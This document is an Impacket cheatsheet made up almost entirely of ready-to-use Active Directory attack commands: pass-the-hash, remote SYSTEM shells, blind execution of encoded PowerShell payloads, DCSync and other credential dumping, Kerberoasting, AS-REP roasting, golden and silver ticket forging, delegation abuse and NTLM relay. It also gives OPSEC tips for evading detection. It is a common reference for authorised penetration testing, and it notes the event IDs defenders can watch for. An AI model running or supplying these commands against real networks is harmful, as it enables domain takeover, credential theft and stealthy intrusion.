# Impacket Suite Cheatsheet

> Complete reference for the Impacket Python toolkit (v0.12+).
> Every command includes all authentication methods and practical usage notes.

---

## Authentication Methods (Apply to All Tools)

```bash
# Password authentication
<tool>.py DOMAIN/username:'P@ssw0rd'@TARGET

# Pass-the-Hash (NTLM)
<tool>.py DOMAIN/username@TARGET -hashes LM:NTLM
<tool>.py DOMAIN/username@TARGET -hashes :NTLM          # LM can be empty

# Kerberos authentication (with ccache)
export KRB5CCNAME=/path/to/ticket.ccache
<tool>.py DOMAIN/username@TARGET -k -no-pass

# Kerberos with AES key
<tool>.py DOMAIN/username@TARGET -aesKey <AES256_KEY>

# Targeting by IP vs hostname
# Use IP for NTLM auth, FQDN for Kerberos
<tool>.py DOMAIN/username:'P@ssw0rd'@10.10.10.1          # NTLM
<tool>.py DOMAIN/username@dc01.corp.local -k -no-pass     # Kerberos
```

---

## Remote Execution Tools

### psexec.py -- SMB Service-Based Execution

```bash
# Interactive SYSTEM shell via service creation
psexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1
psexec.py DOMAIN/admin@10.10.10.1 -hashes :NTLMHASH

# Execute specific command
psexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 "ipconfig /all"

# Use custom service name and path (OPSEC)
psexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 -service-name CoreSvc -remote-binary-name csvc.exe
```

**OPSEC Note**: Creates a service + uploads binary to ADMIN$ share. Leaves artifacts on disk.
Generates Event IDs: 7045 (Service Install), 4697 (Service Install), 4624 Type 3.

### smbexec.py -- SMB Command Service Execution

```bash
# Semi-interactive shell (no binary upload)
smbexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1
smbexec.py DOMAIN/admin@10.10.10.1 -hashes :NTLMHASH

# Specify share for output
smbexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 -share C$
```

**OPSEC Note**: Uses cmd.exe service, no binary upload but each command spawns a service.
Output written to file on share then retrieved. Noisier than wmiexec in event logs.

### wmiexec.py -- WMI Process Creation

```bash
# Semi-interactive shell via WMI
wmiexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1
wmiexec.py DOMAIN/admin@10.10.10.1 -hashes :NTLMHASH

# Execute single command
wmiexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 "whoami /all"

# Specify output share
wmiexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 -share ADMIN$ "hostname"

# No output (blind execution -- useful for launching payloads)
wmiexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 -nooutput "powershell -enc <BASE64>"

# Use specific COM object
wmiexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 -com-version 5.6
```

**OPSEC Note**: No service creation, no binary upload. Uses DCOM port 135 + high port.
Commands run as the authenticated user (not SYSTEM). Good OPSEC choice.

### atexec.py -- Scheduled Task Execution

```bash
# One-shot command via scheduled task
atexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 "whoami"
atexec.py DOMAIN/admin@10.10.10.1 -hashes :NTLMHASH "ipconfig"
```

**OPSEC Note**: Creates and immediately deletes a scheduled task. Generates 4698/4699 events.

### dcomexec.py -- DCOM-Based Execution

```bash
# Use MMC20.Application (default)
dcomexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1

# Use ShellWindows object
dcomexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 -object ShellWindows

# Use ShellBrowserWindow
dcomexec.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 -object ShellBrowserWindow
```

**OPSEC Note**: Uses DCOM objects for execution. Less commonly monitored than SMB-based tools.

---

## Credential Dumping

### secretsdump.py -- The Swiss Army Knife

```bash
# Remote dump: SAM + LSA secrets + cached credentials + NTDS.dit via DRS
secretsdump.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1
secretsdump.py DOMAIN/admin@DC01 -hashes :NTLMHASH

# DCSync only (specific user)
secretsdump.py DOMAIN/admin:'P@ssw0rd'@DC01 -just-dc-user DOMAIN/krbtgt
secretsdump.py DOMAIN/admin:'P@ssw0rd'@DC01 -just-dc-user Administrator

# DCSync -- all users, NTLM only (skip Kerberos keys)
secretsdump.py DOMAIN/admin:'P@ssw0rd'@DC01 -just-dc -just-dc-ntlm

# From local files (offline extraction)
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes LOCAL

# Output to file
secretsdump.py DOMAIN/admin:'P@ssw0rd'@DC01 -outputfile domain_hashes

# Use VSS method for NTDS extraction
secretsdump.py DOMAIN/admin:'P@ssw0rd'@DC01 -use-vss

# Dump machine account hashes (useful for silver tickets)
secretsdump.py DOMAIN/admin:'P@ssw0rd'@DC01 -just-dc-user 'TARGETPC$'
```

---

## Kerberos Tools

### GetNPUsers.py -- AS-REP Roasting

```bash
# With valid credentials -- find and roast
GetNPUsers.py DOMAIN/user:'P@ssw0rd' -dc-ip 10.10.10.1 -request

# Without credentials (if users are known)
GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass -format hashcat

# Output format for cracking tools
GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass -format john
```

### GetUserSPNs.py -- Kerberoasting

```bash
# Find and request all Kerberoastable service tickets
GetUserSPNs.py DOMAIN/user:'P@ssw0rd' -dc-ip 10.10.10.1 -request

# Target specific SPN
GetUserSPNs.py DOMAIN/user:'P@ssw0rd' -dc-ip 10.10.10.1 -request-user svc_sql

# Output to file for offline cracking
GetUserSPNs.py DOMAIN/user:'P@ssw0rd' -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt
```

### getTGT.py -- Request TGT

```bash
# Request TGT with password
getTGT.py DOMAIN/user:'P@ssw0rd' -dc-ip 10.10.10.1

# Request TGT with NTLM hash
getTGT.py DOMAIN/user -dc-ip 10.10.10.1 -hashes :NTLMHASH

# Output saved as user.ccache -- use with KRB5CCNAME
export KRB5CCNAME=user.ccache
```

### getST.py -- Request Service Ticket (S4U)

```bash
# S4U2Self + S4U2Proxy (constrained delegation abuse)
getST.py DOMAIN/svc_account:'P@ssw0rd' -spn cifs/target.domain.local -impersonate Administrator -dc-ip 10.10.10.1

# Resource-based constrained delegation (RBCD)
getST.py DOMAIN/controlled_computer$ -spn cifs/target.domain.local -impersonate Administrator -hashes :HASH -dc-ip 10.10.10.1

# Request with additional S4U2Proxy target
getST.py DOMAIN/svc:'P@ssw0rd' -spn cifs/target -impersonate admin -altservice http/target -dc-ip 10.10.10.1
```

### ticketer.py -- Golden / Silver Ticket Forge

```bash
# Golden Ticket (requires krbtgt NTLM hash)
ticketer.py -nthash <KRBTGT_NTLM> -domain-sid S-1-5-21-XXXX -domain DOMAIN.LOCAL Administrator

# Silver Ticket (requires service account NTLM hash)
ticketer.py -nthash <SVC_NTLM> -domain-sid S-1-5-21-XXXX -domain DOMAIN.LOCAL -spn cifs/target.domain.local Administrator

# Diamond Ticket (modify legitimate TGT)
ticketer.py -request -domain DOMAIN.LOCAL -user user -password 'P@ssw0rd' -nthash <KRBTGT_NTLM> -domain-sid S-1-5-21-XXXX Administrator
```

### ticketConverter.py -- Format Conversion

```bash
# Kirbi (Mimikatz) to ccache (Impacket)
ticketConverter.py ticket.kirbi ticket.ccache

# Ccache to kirbi
ticketConverter.py ticket.ccache ticket.kirbi
```

---

## Enumeration Tools

```bash
# RID cycling / SID brute-force (no creds needed if null session allowed)
lookupsid.py DOMAIN/user:'P@ssw0rd'@10.10.10.1
lookupsid.py DOMAIN/''@10.10.10.1 -no-pass 20000    # Max RID to enumerate

# SAM remote enumeration
samrdump.py DOMAIN/user:'P@ssw0rd'@10.10.10.1

# RPC endpoint enumeration
rpcdump.py 10.10.10.1 | grep -i "MS-" | sort -u

# AD user enumeration via LDAP
GetADUsers.py DOMAIN/user:'P@ssw0rd' -dc-ip 10.10.10.1 -all
```

---

## Relay & Coercion

### ntlmrelayx.py -- Multi-Protocol NTLM Relay

```bash
# Relay to SMB (command execution)
ntlmrelayx.py -t smb://10.10.10.1 -smb2support -c "whoami"

# Relay to LDAP (create machine account for RBCD)
ntlmrelayx.py -t ldap://DC01 --delegate-access --escalate-user attacker$

# Relay to ADCS (ESC8 -- HTTP enrollment)
ntlmrelayx.py -t http://CA01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Relay to MSSQL
ntlmrelayx.py -t mssql://10.10.10.1 -smb2support -q "SELECT @@version"

# Multi-target relay with targets file
ntlmrelayx.py -tf targets.txt -smb2support -of hashes.txt

# SOCKs relay (keep session open for tunneling)
ntlmrelayx.py -t smb://10.10.10.1 -smb2support -socks

# Relay with IPv6 (mitm6 integration)
ntlmrelayx.py -6 -t ldap://DC01 -wh wpad.corp.local --delegate-access
```

---

## Other Useful Tools

```bash
# Interactive SMB client
smbclient.py DOMAIN/user:'P@ssw0rd'@10.10.10.1
# Commands: shares, use <share>, ls, get <file>, put <file>, cd <dir>

# Interactive MSSQL client
mssqlclient.py DOMAIN/user:'P@ssw0rd'@10.10.10.1 -windows-auth
# Enable xp_cmdshell: enable_xp_cmdshell
# Execute: xp_cmdshell whoami

# Remote registry operations
reg.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 add -keyName HKLM\\SOFTWARE -v TestValue -vt REG_SZ -vd "TestData"

# Remote service management
services.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 list
services.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 create -name TestSvc -display "Test" -path "cmd.exe /c whoami"
services.py DOMAIN/admin:'P@ssw0rd'@10.10.10.1 start -name TestSvc

# LDAP domain dump
ldapdomaindump -u 'DOMAIN\user' -p 'P@ssw0rd' 10.10.10.1 -o ldap_dump/
```

---

## Quick Decision Matrix: Which Execution Tool to Use

| Scenario | Best Tool | Reason |
|---|---|---|
| Need SYSTEM shell | psexec.py | Runs as SYSTEM via service |
| OPSEC-sensitive | wmiexec.py | No service, no binary on disk |
| Firewall blocks SMB | dcomexec.py | Uses DCOM (135 + high ports) |
| Single command needed | atexec.py | Clean execution via scheduled task |
| Need to relay creds | ntlmrelayx.py | Multi-protocol relay |
| Dump all domain hashes | secretsdump.py | DCSync via DRS replication |
| Kerberos-only environment | Any tool with -k | All tools support Kerberos auth |
